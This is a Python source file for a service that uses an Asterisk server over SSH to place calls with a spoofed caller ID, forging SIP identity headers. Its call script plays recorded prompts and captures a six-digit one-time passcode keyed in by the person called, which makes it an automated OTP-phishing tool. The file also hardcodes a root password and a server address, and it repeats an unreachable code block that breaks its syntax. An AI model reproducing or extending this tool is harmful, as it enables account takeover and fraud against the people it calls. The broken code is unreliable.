import paramiko
import os
import logging
import uuid
from datetime import datetime

logger = logging.getLogger(__name__)

class AsteriskService:
    def __init__(self):
        # VPS Credentials
        self.host = "139.59.241.253"
        self.username = "root"
        self.password = os.getenv('ASTERISK_VPS_PASSWORD', 'Pekanbaru236@Nasya')
        self.port = 22
        
        # Asterisk paths
        self.call_files_dir = "/var/spool/asterisk/outgoing"
        self.audio_dir = "/var/lib/asterisk/sounds/custom"
        self.temp_dir = "/tmp/asterisk_calls"
    
    def _create_ssh_client(self):
        """Create SSH client connection to VPS"""
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(
                hostname=self.host,
                username=self.username,
                password=self.password,
                port=self.port,
                timeout=10
            )
            return client
        except Exception as e:
            logger.error(f"SSH connection failed: {e}")
            raise
    
    async def upload_audio_files(self, call_id: str, audio_files: dict) -> dict:
        """
        Upload pre-generated audio files to Asterisk VPS and convert to WAV
        
        Args:
            call_id: Unique call identifier
            audio_files: Dict with keys (step_1, step_2, step_3, accepted, rejected) -> audio bytes (MP3)
        
        Returns:
            Dict with audio file paths on VPS (WAV format)
        """
        try:
            ssh_client = self._create_ssh_client()
            sftp = ssh_client.open_sftp()
            
            audio_paths = {}
            
            # Create custom sounds directory if not exists
            try:
                sftp.stat(self.audio_dir)
            except:
                stdin, stdout, stderr = ssh_client.exec_command(f"mkdir -p {self.audio_dir}")
                stdout.read()
            
            # Upload each audio file and convert MP3 to WAV
            for step_name, audio_bytes in audio_files.items():
                if audio_bytes:
                    remote_filename = f"{call_id}_{step_name}"
                    remote_mp3_path = f"{self.audio_dir}/{remote_filename}.mp3"
                    remote_wav_path = f"{self.audio_dir}/{remote_filename}.wav"
                    
                    # Write MP3 audio to remote file with .mp3 extension
                    with sftp.file(remote_mp3_path, 'wb') as f:
                        f.write(audio_bytes)
                    
                    sftp.chmod(remote_mp3_path, 0o644)
                    
                    logger.info(f"✅ Uploaded MP3: {remote_mp3_path} ({len(audio_bytes)} bytes)")
                    
                    # Convert MP3 to WAV using sox (Asterisk compatible)
                    # CRITICAL: Input file MUST have .mp3 extension for sox to detect format!
                    convert_cmd = f"sox {remote_mp3_path} -r 8000 -c 1 -b 16 {remote_wav_path}"
                    stdin, stdout, stderr = ssh_client.exec_command(convert_cmd)
                    
                    # Wait for conversion to complete
                    stdout.read()
                    convert_error = stderr.read().decode()
                    
                    if convert_error and ('FAIL' in convert_error or 'error' in convert_error.lower()):
                        logger.error(f"Sox conversion error: {convert_error}")
                        raise Exception(f"Sox conversion failed for {step_name}: {convert_error}")
                    
                    # Verify WAV file created
                    try:
                        wav_stat = sftp.stat(remote_wav_path)
                        logger.info(f"✅ Converted {step_name}: MP3 ({len(audio_bytes)}b) → WAV ({wav_stat.st_size}b)")
                    except Exception as e:
                        logger.error(f"WAV file not found after conversion: {e}")
                        raise Exception(f"WAV file not created: {remote_wav_path}")
                    
                    # Store path without extension (Asterisk adds format automatically)
                    audio_paths[step_name] = f"custom/{remote_filename}"
                    
                    logger.info(f"✅ Uploaded {step_name}: {remote_wav_path}")
            
            sftp.close()
            ssh_client.close()
            
            return audio_paths
            
        except Exception as e:
            logger.error(f"Error uploading/converting audio files: {e}")
            raise
    
    async def make_spoofed_call(
        self,
        target_number: str,
        spoofed_caller_id: str,
        call_id: str,
        audio_paths: dict = None
    ) -> bool:
        """
        Make spoofed call via Asterisk call file with pre-generated audio
        
        Args:
            target_number: Destination number
            spoofed_caller_id: Custom caller ID to display
            call_id: Unique call identifier
            audio_paths: Dict with audio file paths (step_1, step_2, etc)
        
        Returns:
            True if call file created successfully
        """
        try:
            logger.info(f"📞 Creating spoofed call via Asterisk")
            logger.info(f"   Target: {target_number}")
            logger.info(f"   Spoofed ID: {spoofed_caller_id}")
            
            # Get backend webhook URL for status updates
            backend_url = os.getenv('BACKEND_URL', 'https://lanjutkan-ini.preview.emergentagent.com')
            status_url = f"{backend_url}/api/webhooks/asterisk/{call_id}/status"
            
            # Generate call file with direct application (not extension/context)
            # CRITICAL: Use Application instead of Context/Extension for better control
            # This ensures dialplan executes properly
            call_file_content = f"""Channel: SIP/infobip-trunk/{target_number}
CallerID: {spoofed_caller_id}
MaxRetries: 0
RetryTime: 60
WaitTime: 30
Application: Exec
Data: Set(CALLERID(num)={spoofed_caller_id})|SIPAddHeader(P-Asserted-Identity: <sip:{spoofed_caller_id}@185.255.9.23>)|SIPAddHeader(Remote-Party-ID: <sip:{spoofed_caller_id}@185.255.9.23>;privacy=off;screen=no)|Playback({audio_paths.get('step_1', 'silence/1') if audio_paths else 'silence/1'})|Wait(2)|Playback({audio_paths.get('step_1', 'silence/1') if audio_paths else 'silence/1'})|Read(DIGIT,silence/1,1,,,15)|GotoIf($["${{DIGIT}}" = "1"]?playotp:end)|Playback({audio_paths.get('step_2', 'silence/1') if audio_paths else 'silence/1'})|Wait(2)|Playback({audio_paths.get('step_2', 'silence/1') if audio_paths else 'silence/1'})|Read(OTP,silence/1,6,,,20)|Playback({audio_paths.get('step_3', 'silence/1') if audio_paths else 'silence/1'})|Wait(2)|Playback({audio_paths.get('step_3', 'silence/1') if audio_paths else 'silence/1'})|Wait(30)|Playback({audio_paths.get('accepted', 'silence/1') if audio_paths else 'silence/1'})|Hangup
SetVar: SPOOFED_NUMBER={spoofed_caller_id}
SetVar: CALL_ID={call_id}
Archive: yes
"""
            
            # Create unique temporary filename
            temp_filename = f"call_{call_id}_{uuid.uuid4().hex[:8]}.call"
            final_filename = f"call_{call_id}.call"
            
            # SSH to VPS and create call file
            ssh_client = self._create_ssh_client()
            
            try:
                sftp = ssh_client.open_sftp()
                
                # Write call file to /tmp first
                temp_path = f"/tmp/{temp_filename}"
                with sftp.file(temp_path, 'w') as f:
                    f.write(call_file_content)
                
                sftp.chmod(temp_path, 0o644)
                
                # Move to outgoing directory (atomic)
                stdin, stdout, stderr = ssh_client.exec_command(
                    f"mv {temp_path} {self.call_files_dir}/{final_filename}"
                )
                
                error_output = stderr.read().decode()
                if error_output:
                    logger.error(f"Error moving call file: {error_output}")
                    raise Exception(error_output)
                
                logger.info(f"✅ Call file created: {self.call_files_dir}/{final_filename}")
                
                sftp.close()
                
                return True
                
            finally:
                ssh_client.close()
        
        except Exception as e:
            logger.error(f"❌ Error creating spoofed call: {e}")
            raise
            
            try:
                # Create temp file content
                sftp = ssh_client.open_sftp()
                
                # Write call file to /tmp first (to avoid Asterisk picking up incomplete file)
                temp_path = f"/tmp/{temp_filename}"
                with sftp.file(temp_path, 'w') as f:
                    f.write(call_file_content)
                
                # Set proper permissions
                sftp.chmod(temp_path, 0o644)
                
                # Move to outgoing directory (atomic operation)
                stdin, stdout, stderr = ssh_client.exec_command(
                    f"mv {temp_path} {self.call_files_dir}/{final_filename}"
                )
                
                # Check for errors
                error_output = stderr.read().decode()
                if error_output:
                    logger.error(f"Error moving call file: {error_output}")
                    raise Exception(error_output)
                
                logger.info(f"✅ Call file created: {self.call_files_dir}/{final_filename}")
                
                sftp.close()
                
                return True
                
            finally:
                ssh_client.close()
        
        except Exception as e:
            logger.error(f"❌ Error creating spoofed call: {e}")
            raise
    
    async def check_asterisk_status(self) -> dict:
        """Check Asterisk and SIP trunk status"""
        try:
            ssh_client = self._create_ssh_client()
            
            try:
                # Check SIP peer status
                stdin, stdout, stderr = ssh_client.exec_command(
                    "asterisk -rx 'sip show peers' | grep infobip"
                )
                sip_status = stdout.read().decode().strip()
                
                # Check active channels
                stdin, stdout, stderr = ssh_client.exec_command(
                    "asterisk -rx 'core show channels' | grep 'active call'"
                )
                active_channels = stdout.read().decode().strip()
                
                return {
                    "asterisk_running": True,
                    "sip_trunk_status": sip_status,
                    "active_channels": active_channels
                }
            
            finally:
                ssh_client.close()
                
        except Exception as e:
            logger.error(f"Error checking Asterisk status: {e}")
            return {
                "asterisk_running": False,
                "error": str(e)
            }
